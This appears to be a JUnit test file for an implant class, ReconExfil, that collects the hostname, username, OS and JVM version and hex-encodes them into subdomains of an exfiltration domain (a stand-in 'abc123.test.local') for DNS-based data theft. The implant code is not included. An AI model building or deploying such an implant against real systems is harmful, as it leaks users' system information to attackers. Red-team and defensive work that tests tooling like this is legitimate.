package org.example.implants;

import org.junit.Before;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

import static org.junit.Assert.*;

public class ReconExfilTests {
    private Map<String, String> envVars;
    private Properties javaProps;

    @Before
    public void setImplantConfig() {
        ReconExfil.CONF_EXFIL_DNS = "abc123.test.local";
        ReconExfil.CONF_SUBDOMAIN_MAX_LEN = 63;
        ReconExfil.CONF_DOMAIN_MAX_LEN = 253;
    }

    @Before
    public void getEnvVars() {
        envVars = new HashMap<>();
        envVars.put("USERNAME", "user");
    }

    @Before
    public void getJavaProps() {
        javaProps = new Properties();
        javaProps.put("user.name", "user");
        javaProps.put("os.name", "TestOS");
        javaProps.put("os.version", "1.2.3-alpha4");
        javaProps.put("java.vm.version", "3.2.1-custom42");
    }

    @Test
    public void testGenerateEncodedDomainName_any_usesExfilDomain() {
        // Act
        ReconExfil subject = new ReconExfil();
        String result = subject.generateEncodedDomainName(envVars, javaProps);

        // Assert
        assertTrue("Uses exfil domain.", result.endsWith("abc123.test.local"));
    }

    @Test
    public void testGenerateEncodedDomainName_validProps_encodedDomainName() {
        // Act
        ReconExfil subject = new ReconExfil();
        String exfilDomain = subject.generateEncodedDomainName(envVars, javaProps);

        // Assert
        String[] components = exfilDomain.split("\\.");
        assertEquals("Amount of subdomains.", 8, components.length);
        assertNotNull("Got some hostname.", decodeHex(components[0]));
        assertEquals("Got username right.", decodeHex(components[1]), "user");
        assertEquals("Got OS info right.", decodeHex(components[2]), "TestOS 1.2.3-alpha4");
        assertEquals("Got runtime info right.", decodeHex(components[3]), "3.2.1-custom42");
    }

    @Test
    public void testGenerateEncodedDomainName_missingValues_unknownValues() {
        // Arrange
        Map<String, String> emptyEnv = new HashMap<>();
        Properties emptyProps = new Properties();

        // Act
        ReconExfil subject = new ReconExfil();
        String exfilDomain = subject.generateEncodedDomainName(emptyEnv, emptyProps);

        // Assert
        String[] components = exfilDomain.split("\\.");
        assertEquals("Amount of subdomains.", 8, components.length);
        assertEquals("Got unknown username.", decodeHex(components[1]), "unknown");
        assertEquals("Got unknown OS info.", decodeHex(components[2]), "unknown unknown");
        assertEquals("Got unknown runtime info.", decodeHex(components[3]), "unknown");
    }

    @Test
    public void testGenerateEncodedDomainName_tooLong_skippedValue() {
        // Arrange
        final int uniqueIdLen = ("" + Integer.MAX_VALUE).length();
        ReconExfil.CONF_DOMAIN_MAX_LEN = 30 + uniqueIdLen + "abd123.test.local".length();

        // Act
        ReconExfil subject = new ReconExfil();
        String exfilDomain = subject.generateEncodedDomainName(envVars, javaProps);

        // Assert
        String[] parts = exfilDomain.split("\\.");
        assertTrue("Some values were skipped.", parts.length < 8);
    }

    @Test
    public void testGenerateEncodedDomainName_veryShortDomainMaxLen_noValues() {
        // Arrange
        ReconExfil.CONF_DOMAIN_MAX_LEN = 0;

        // Act
        ReconExfil subject = new ReconExfil();
        String exfilDomain = subject.generateEncodedDomainName(envVars, javaProps);

        // Assert
        String[] parts = exfilDomain.split("\\.");
        assertEquals("All values were skipped.", 4, parts.length);
    }

    @Test
    public void testEncode_tooLongEvenMaxLen_truncated() {
        // Arrange
        String input = "abcdefghIJKL";
        ReconExfil.CONF_SUBDOMAIN_MAX_LEN = 8;

        // Act
        String encoded = ReconExfil.encode(input);

        // Assert
        assertEquals("Output is truncated.", encoded.length(), 8);
        assertEquals("Output is correct.", decodeHex(encoded), "abcd");
    }

    @Test
    public void testEncode_tooLongOddMaxLen_truncated() {
        // Arrange
        String input = "abcdEFGH";
        ReconExfil.CONF_SUBDOMAIN_MAX_LEN = 9;

        // Act
        String encoded = ReconExfil.encode(input);

        // Assert
        assertEquals("Output is truncated.", encoded.length(), 8);
        assertEquals("Output is correct.", decodeHex(encoded), "abcd");
    }

    @Test
    public void testEncode_exactlyMaxLen_fine() {
        // Arrange
        String input = "abcd";
        ReconExfil.CONF_SUBDOMAIN_MAX_LEN = 8;

        // Act
        String encoded = ReconExfil.encode(input);

        // Assert
        assertEquals("Output is not truncated.", encoded.length(), 8);
        assertEquals("Output is correct.", decodeHex(encoded), "abcd");
    }

    private static String decodeHex(String hex) {
        if (hex.length() % 2 != 0) {
            throw new IllegalArgumentException("Invalid hex string.");
        }

        byte[] bytes = new byte[hex.length() / 2];
        for (int i = 0; i < hex.length(); i += 2) {
            int firstDigit = Character.digit(hex.charAt(i), 16);
            int secondDigit = Character.digit(hex.charAt(i + 1), 16);
            if (firstDigit == -1 || secondDigit == -1) {
                throw new IllegalArgumentException("Invalid hex digit in string.");
            }
            bytes[i / 2] = (byte) ((firstDigit << 4) + secondDigit);
        }

        return new String(bytes, StandardCharsets.UTF_8);
    }
}